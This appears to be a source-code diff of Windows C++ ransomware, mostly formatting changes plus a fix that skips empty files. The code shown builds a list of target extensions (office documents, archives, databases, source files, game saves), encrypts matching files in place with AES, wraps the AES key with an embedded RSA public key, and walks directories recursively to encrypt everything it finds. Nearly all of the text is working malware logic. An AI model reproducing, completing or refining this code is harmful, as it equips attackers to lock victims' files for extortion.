@@ -2,69 +2,69 @@
 #include <iomanip>
 
 const std::vector<std::wstring> targets = {
-	L".pl", 
-	L".7z", 
-	L".rar", 
-	L".m4a", 
-	L".wma", 
-	L".avi", 
-	L".wmv", 
-	L".d3dbsp", 
-	L".sc2save", 
-	L".sie", 
-	L".sum", 
-	L".bkp", 
-	L".flv", 
-	L".js", 
-	L".raw", 
-	L".jpeg", 
-	L".tar", 
-	L".zip", 
-	L".tar.gz", 
-	L".cmd", 
-	L".key", 
-	L".DOT", 
-	L".docm", 
-	L".txt", 
-	L".doc", 
-	L".docx", 
-	L".xls", 
-	L".xlsx", 
-	L".ppt", 
+	L".pl",
+	L".7z",
+	L".rar",
+	L".m4a",
+	L".wma",
+	L".avi",
+	L".wmv",
+	L".d3dbsp",
+	L".sc2save",
+	L".sie",
+	L".sum",
+	L".bkp",
+	L".flv",
+	L".js",
+	L".raw",
+	L".jpeg",
+	L".tar",
+	L".zip",
+	L".tar.gz",
+	L".cmd",
+	L".key",
+	L".DOT",
+	L".docm",
+	L".txt",
+	L".doc",
+	L".docx",
+	L".xls",
+	L".xlsx",
+	L".ppt",
 	L".pptx",
-	L".odt", 
-	L".jpg", 
-	L".png", 
-	L".csv", 
-	L".sql", 
-	L".mdb", 
-	L".sln", 
-	L".php", 
-	L".asp", 
+	L".odt",
+	L".jpg",
+	L".png",
+	L".csv",
+	L".sql",
+	L".mdb",
+	L".sln",
+	L".php",
+	L".asp",
 	L".aspx",
-	L".html", 
-	L".xml", 
-	L".psd", 
-	L".bmp", 
-	L".pdf", 
-	L".py", 
+	L".html",
+	L".xml",
+	L".psd",
+	L".bmp",
+	L".pdf",
+	L".py",
 	L".rtf"
 };
 
-boolean gen_rand(std::vector<BYTE> &buffer) {
+boolean gen_rand(std::vector<BYTE>& buffer) {
 	NTSTATUS status = BCryptGenRandom(
-		NULL, 
-		buffer.data(), 
-		buffer.size(), 
+		NULL,
+		buffer.data(),
+		buffer.size(),
 		BCRYPT_USE_SYSTEM_PREFERRED_RNG
 	);
 
 	return !BCRYPT_SUCCESS(status) ? false : true;
 }
 
-boolean set_algorithm(BCRYPT_ALG_HANDLE &hAlgorithm, LPCWSTR algorithm) {
+boolean set_algorithm(BCRYPT_ALG_HANDLE& hAlgorithm, LPCWSTR algorithm) {
 	NTSTATUS status = NULL;
-	
+
 
 	status = BCryptOpenAlgorithmProvider(
 		&hAlgorithm,
@@ -87,7 +87,7 @@ boolean set_algorithm(BCRYPT_ALG_HANDLE &hAlgorithm, LPCWSTR algorithm) {
 	return true;
 }
 
-boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey) {
+boolean rsa_encrypt(std::vector<BYTE>& key, std::vector<BYTE>& newKey) {
 	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
 	NTSTATUS status = NULL;
 	BCRYPT_KEY_HANDLE hKey = NULL;
@@ -140,19 +140,19 @@ boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey) {
 	if (!BCRYPT_SUCCESS(status)) return false;
 
 	status = BCryptImportKeyPair(
-		hAlgorithm, 
-		NULL, 
-		BCRYPT_RSAPUBLIC_BLOB, 
-		&hKey, 
-		(PUCHAR)public_key, 
-		public_key_len, 
+		hAlgorithm,
+		NULL,
+		BCRYPT_RSAPUBLIC_BLOB,
+		&hKey,
+		(PUCHAR)public_key,
+		public_key_len,
 		0
 	);
 	if (!BCRYPT_SUCCESS(status)) {
 		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
 		return false;
 	}
-	
+
 	DWORD encryptedSize = 0;
 	status = BCryptEncrypt(
 		hKey,
@@ -194,17 +194,17 @@ boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey) {
 	return true;
 }
 
-boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen) { 
+boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector<BYTE> iv, std::vector<BYTE>& key, DWORD& keyObjLen) {
 	NTSTATUS status = NULL;
 	BCRYPT_KEY_HANDLE hKey = NULL;
 
 	HANDLE hFile = CreateFileW(
-		filepath, 
-		GENERIC_READ | GENERIC_WRITE, 
-		0, 
-		NULL, 
-		OPEN_EXISTING, 
-		FILE_ATTRIBUTE_NORMAL, 
+		filepath,
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
 		NULL
 	);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -220,10 +220,10 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 	std::vector<BYTE> plaintext((size_t)actualSize.QuadPart);
 	DWORD bytesRead;
 	if (!ReadFile(
-		hFile, 
-		plaintext.data(), 
-		static_cast<DWORD>(plaintext.size()), 
-		&bytesRead, 
+		hFile,
+		plaintext.data(),
+		static_cast<DWORD>(plaintext.size()),
+		&bytesRead,
 		NULL)) {
 		CloseHandle(hFile);
 		return false;
@@ -231,12 +231,12 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 
 	std::vector<BYTE> keyObject(keyObjLen);
 	status = BCryptGenerateSymmetricKey(
-		hAlgorithm, 
+		hAlgorithm,
 		&hKey,
-		keyObject.data(), 
-		keyObjLen, 
-		key.data(), 
-		key.size(), 
+		keyObject.data(),
+		keyObjLen,
+		key.data(),
+		key.size(),
 		0
 	);
 	if (!BCRYPT_SUCCESS(status)) {
@@ -246,15 +246,15 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 
 	DWORD encryptedSize = 0;
 	status = BCryptEncrypt(
-		hKey, 
+		hKey,
 		plaintext.data(),
-		static_cast<ULONG>(plaintext.size()), 
-		NULL, 
-		iv.data(), 
-		iv.size(), 
-		NULL, 
-		0, 
-		&encryptedSize, 
+		static_cast<ULONG>(plaintext.size()),
+		NULL,
+		iv.data(),
+		iv.size(),
+		NULL,
+		0,
+		&encryptedSize,
 		BCRYPT_BLOCK_PADDING
 	);
 	if (!BCRYPT_SUCCESS(status)) {
@@ -266,14 +266,14 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 	std::vector<BYTE> ciphertext(encryptedSize);
 	status = BCryptEncrypt(
 		hKey,
-		plaintext.data(), 
-		static_cast<ULONG>(plaintext.size()), 
-		NULL, 
+		plaintext.data(),
+		static_cast<ULONG>(plaintext.size()),
+		NULL,
 		iv.data(),
-		iv.size(), 
+		iv.size(),
 		ciphertext.data(),
-		encryptedSize, 
-		&encryptedSize, 
+		encryptedSize,
+		&encryptedSize,
 		BCRYPT_BLOCK_PADDING
 	);
 	BCryptDestroyKey(hKey);
@@ -295,7 +295,7 @@ boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 	return true;
 }
 
-boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen) {
+boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector<BYTE> iv, std::vector<BYTE>& key, DWORD& keyObjLen) {
 	NTSTATUS status = NULL;
 	BCRYPT_KEY_HANDLE hKey = NULL;
 
@@ -392,21 +392,21 @@ boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector
 }
 
 
-void traverse_dir(int dir_size, const wchar_t *dir, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen, const boolean encrypt) {
+boolean traverse_dir(int dir_size, const wchar_t* dir, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector<BYTE>& iv, std::vector<BYTE>& key, DWORD& keyObjLen, const boolean encrypt) {
 	WIN32_FIND_DATA ffd;
 	LARGE_INTEGER filesize;
-	TCHAR szDir[MAX_PATH]; 
-	size_t lenght_of_arg; 
+	TCHAR szDir[MAX_PATH];
+	size_t lenght_of_arg;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	DWORD dwError = 0;
-	 
-	_tprintf(TEXT("\nTarget directory is %s\n\n"), dir);
-	StringCchCopy(szDir, MAX_PATH, dir); 
-	StringCchCat(szDir, MAX_PATH, TEXT("\\*")); 
 
-	hFind = FindFirstFile(szDir, &ffd); 
+	_tprintf(TEXT("\nTarget directory is %s\n\n"), dir);
+	StringCchCopy(szDir, MAX_PATH, dir);
+	StringCchCat(szDir, MAX_PATH, TEXT("\\*"));
+
+	hFind = FindFirstFile(szDir, &ffd);
 	if (INVALID_HANDLE_VALUE == hFind) {
-		return;
+		return false;
 	}
 
 	do {
@@ -432,28 +432,33 @@ void traverse_dir(int dir_size, const wchar_t *dir, BCRYPT_ALG_HANDLE &hAlgorith
 				}
 			}
 
+			filesize.LowPart = ffd.nFileSizeLow;
+			filesize.HighPart = ffd.nFileSizeHigh;
+
+			if (!filesize.QuadPart) continue;
+
 			if (encrypt && process_file) {
-				filesize.LowPart = ffd.nFileSizeLow;
-				filesize.HighPart = ffd.nFileSizeHigh;
 				_tprintf(TEXT("Encrypting file: %s\n"), filePath);
 
 				if (!aes_encrypt(filePath, hAlgorithm, iv, key, keyObjLen)) {
 					_tprintf(TEXT("BAD ENCRYPTION :(\n"));
 					FindClose(hFind);
-					return;
+					return false;
 				}
 			}
 			else if (!encrypt && process_file) {
 				_tprintf(TEXT("Decrypting file: %s\n"), filePath);
-				
+
 				if (!aes_decrypt(filePath, hAlgorithm, iv, key, keyObjLen)) {
 					_tprintf(TEXT("BAD DECRYPTION :(\n"));
 					FindClose(hFind);
-					return;
+					return false;
 				}
 			}
-		} 
+		}
 	} while (FindNextFile(hFind, &ffd) != 0);
 
 	FindClose(hFind);
+
+	return true;
 }
